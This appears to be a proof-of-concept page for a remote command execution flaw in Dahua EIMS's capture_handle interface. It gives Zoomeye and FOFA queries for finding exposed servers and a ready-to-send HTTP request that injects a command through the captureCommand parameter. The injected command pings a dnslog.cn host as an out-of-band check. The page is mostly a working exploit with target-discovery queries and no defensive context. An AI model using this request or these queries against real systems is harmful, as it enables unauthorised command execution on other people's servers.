## 大华EIMS-capture_handle接口远程命令执行漏洞

## Zoomeye
```
 app:"大华 EIMS"
```

## fofa
```
"<title>eims</title>"
```


## poc
```
GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20xxx.dnslog.cn%20index.pcap HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: :9080
```

![63e62605aa1608f45153df0fd67b3632](https://github.com/wy876/POC/assets/139549762/f46556c9-dea7-4e50-9199-29229d977d2f)

![c5f4eb4662d85c100e7e6dc67621a6e8](https://github.com/wy876/POC/assets/139549762/8a08fbe3-57cc-4d99-a202-8fa23ad69779)
